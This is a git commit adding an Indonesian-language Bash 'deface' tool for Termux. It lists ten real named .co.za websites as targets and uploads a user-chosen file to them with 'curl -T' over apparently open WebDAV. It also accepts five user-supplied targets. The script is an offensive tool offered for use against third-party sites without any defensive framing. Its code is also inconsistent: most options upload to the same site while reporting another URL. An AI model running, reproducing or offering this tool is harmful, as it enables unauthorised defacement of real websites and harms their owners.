74760d05d8029f16a259e222444130ee42c47e6e
ibar12345 <44119179+ibar12345@users.noreply.github.com>
2018-11-13 07:23:52 +0700

    Noob

---
+++ webdav.sh
@@ -0,0 +1,230 @@
+#usr/bin/bash
+#recode itu jelek ya asw
+#hargai karya orang njir:v
+#noob mah bebas
+#version 1
+clear
+green="\033[32;1m"
+yellow="\033[33;1m"
+red="\033[35;1m"
+purple="\033[37;1m"
+cyan="\033[36;1m"
+white="\033[39;1m"
+
+echo "\033[31;1m[+]--------------------------------------------------[+]"
+echo "\033[31;1m | [AUTHOR       ] : Mr.X ForAKA96                    |" 
+echo "\033[31;1m | [TEAM         ] : Termux Tools-ID                  |" 
+echo "\033[31;1m | [VERSION TOOLS] : V.1                              |" 
+echo "\033[37;1m | [KONTAK       ] : 081230754052                     |" 
+echo "\033[37;1m | [NOTES        ] : simpan script di memori internal |" 
+echo "\033[37;1m | [SPECIAL      ] : HARI PAHLAWAN                    |"
+echo "\033[37;1m[+]--------------------------------------------------[+]"
+
+echo " "
+echo " "
+echo "\033[35;1m       ...:::PILIH WEB YANG INGIN DI DEFACE:::..."
+echo "\033[31;1m[+]--------------------------------------------------[+]"
+echo $white "| 01.> http://colourfactory.co.za                    |"
+echo "\033[31;1m[+]--------------------------------------------------[+]"
+echo $white "| 02.> http://contsol.co.za                          |"
+echo "\033[31;1m[+]--------------------------------------------------[+]"
+echo $white "| 03.> http://sportspod.co.za                        |"
+echo "\033[31;1m[+]--------------------------------------------------[+]"
+echo $white "| 04.> http://clcooling.co.za                        |"
+echo "\033[31;1m[+]--------------------------------------------------[+]"
+echo $white "| 05.> http://homebuzz.co.za                         |"
+echo "\033[31;1m[+]--------------------------------------------------[+]"
+echo $white "| 06.> http://gofiguretraining.co.za                 |"
+echo "\033[31;1m[+]--------------------------------------------------[+]"
+echo $white "| 07.> http://democonstruction.co.za                 |"
+echo "\033[31;1m[+]--------------------------------------------------[+]"
+echo $white "| 08.> http://centraltech.co.za                      |"
+echo "\033[31;1m[+]--------------------------------------------------[+]"
+echo $white "| 09.> http://tcnig.co.za                            |"
+echo "\033[31;1m[+]--------------------------------------------------[+]"
+echo $white "| 10.> http://vmicl.co.za                            |"
+echo "\033[31;1m[+]--------------------------------------------------[+]"
+echo " "
+echo " "
+echo "\033[35;1m                ...:::PUNYA TARGET:::..."
+echo "\033[31;1m[+]--------------------------------------------------[+]"
+echo $white "| 11.> PUNYA TARGET SENDIRI                          |"
+echo "\033[31;1m[+]--------------------------------------------------[+]"
+echo " "
+echo " "
+echo "\033[35;1m                   ...:::KELUAR:::..."
+echo "\033[31;1m[+]--------------------------------------------------[+]"
+echo $white "| 00.> KELUAR                                        |"
+echo "\033[31;1m[+]--------------------------------------------------[+]"
+echo "\033[32;1m"
+read -p "N.C.H~Mr.X ForAKA96~#" bro
+
+if [ $bro = 01 ] || [ $bro = 01 ]
+then
+clear
+figlet Mr.X ForAKA96 | lolcat
+echo $cyan "Masukan Nama script kalian"
+read -p "=====>" script
+curl -T /storage/emulated/0/$script  http://colourfactory.co.za
+echo "\033[33;1m"
+echo "Selesai!!!...  (http://colourfactory.co.za/$script) "
+fi
+
+if [ $bro = 02 ] || [ $bro = 02 ]
+then
+clear
+figlet Mr.X ForAKA96 | lolcat
+echo $cyan "Masukan Nama script kalian"
+read -p "=====>" script
+curl -T /storage/emulated/0/$script  http://colourfactory.co.za
+echo "\033[33;1m"
+echo "Selesai!!!...  (http://contsol.co.za/$script) "
+fi
+
+if [ $bro = 03 ] || [ $bro = 03 ]
+then
+clear
+figlet Mr.X ForAKA96 | lolcat
+echo $cyan "Masukan Nama script kalian"
+read -p "=====>" script
+curl -T /storage/emulated/0/$script  http://colourfactory.co.za
+echo "\033[33;1m"
+echo "Selesai!!!...  (http://sportspod.co.za/$script) "
+fi
+
+if [ $bro = 04 ] || [ $bro = 04 ]
+then
+clear
+figlet Mr.X ForAKA96 | lolcat
+echo $cyan "Masukan Nama script kalian"
+read -p "=====>" script
+curl -T /storage/emulated/0/$script  http://colourfactory.co.za
+echo "\033[33;1m"
+echo "Selesai!!!...  (http://contsol.co.za/$script) "
+fi
+
+if [ $bro = 05 ] || [ $bro = 05 ]
+then
+clear
+figlet Mr.X ForAKA96 | lolcat
+echo $cyan "Masukan Nama script kalian"
+read -p "=====>" script
+curl -T /storage/emulated/0/$script  http://colourfactory.co.za
+echo "\033[33;1m"
+echo "Selesai!!!...  (http://contsol.co.za/$script) "
+fi
+
+if [ $bro = 06 ] || [ $bro = 06 ]
+then
+clear
+figlet Mr.X ForAKA96 | lolcat
+echo $cyan "Masukan Nama script kalian"
+read -p "=====>" script
+curl -T /storage/emulated/0/$script  http://colourfactory.co.za
+echo "\033[33;1m"
+echo "Selesai!!!...  (http://contsol.co.za/$script) "
+fi
+
+if [ $bro = 07 ] || [ $bro = 07 ]
+then
+clear
+figlet Mr.X ForAKA96 | lolcat
+echo $cyan "Masukan Nama script kalian"
+read -p "=====>" script
+curl -T /storage/emulated/0/$script  http://colourfactory.co.za
+echo "\033[33;1m"
+echo "Selesai!!!...  (http://contsol.co.za/$script) "
+fi
+
+if [ $bro = 08 ] || [ $bro = 08 ]
+then
+clear
+figlet Mr.X ForAKA96 | lolcat
+echo $cyan "Masukan Nama script kalian"
+read -p "=====>" script
+curl -T /storage/emulated/0/$script  http://colourfactory.co.za
+echo "\033[33;1m"
+echo "Selesai!!!...  (http://contsol.co.za/$script) "
+fi
+
+if [ $bro = 09 ] || [ $bro = 09 ]
+then
+clear
+figlet Mr.X ForAKA96 | lolcat
+echo $cyan "Masukan Nama script kalian"
+read -p "=====>" script
+curl -T /storage/emulated/0/$script  http://colourfactory.co.za
+echo "\033[33;1m"
+echo "Selesai!!!...  (http://contsol.co.za/$script) "
+fi
+
+if [ $bro = 10 ] || [ $bro = 10 ]
+then
+clear
+figlet Mr.X ForAKA96 | lolcat
+echo $cyan "Masukan Nama script kalian"
+read -p "=====>" script
+curl -T /storage/emulated/0/$script  http://colourfactory.co.za
+echo "\033[33;1m"
+echo "Selesai!!!...  (http://contsol.co.za/$script) "
+fi
+
+if [ $bro = 11 ] || [ $bro = 11 ]
+then
+clear
+figlet Mr.X ForAKA96 | lolcat
+echo "\033[31;1m"
+echo "Masukan nama script!!!..."
+read -p "=======>>>" script
+echo "\033[35;1mMasukan Web Target Ke1"
+read -p "=======>>>" Ke1
+curl -T /storage/emulated/0/$script $Ke1
+echo "\033[34;1mMasukan Web Target Ke2 "
+read -p "=======>>>" Ke2
+curl -T /storage/emulated/0/$script $Ke2
+echo "\033[33;1mMasukan Web Target Ke3"
+read -p "=======>>>" Ke3
+curl -T /storage/emulated/0/$script $Ke3
+echo "\033[32;1mMasukan Web Target Ke4"
+read -p "=======>>>" Ke4
+curl -T /storage/emulated/0/$script $Ke4
+echo "\033[36;1mMasukan Web Target Ke5"
+read -p "=======>>>" Ke5
+curl -T /storage/emulated/0/$script $Ke5
+echo "《=========================SEDANG PROSES=======================》" | lolcat
+sleep 1
+echo $green "Silahkan Cek Web ($Ke1/$script)"
+echo $purple "Silahkan Cek Web ($Ke2/$script)"
+echo $cyan "Silahkan Cek Web ($Ke3/$script)"
+echo $yellow "Silahkan Cek Web ($Ke4/$script)"
+echo $red "Silahkan Cek Web ($Ke5/$script)"
+echo "《=============================================================》" | lolcat
+fi
+
+if [ $bro = 00 ] || [ $bro = 00 ]
+then
+clear
+echo "\033[31mTHAKS TO"
+echo "\033[33mNEWBIE CYBER HACKED"
+echo "\033[32mTermux Tools-ID"
+fi
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
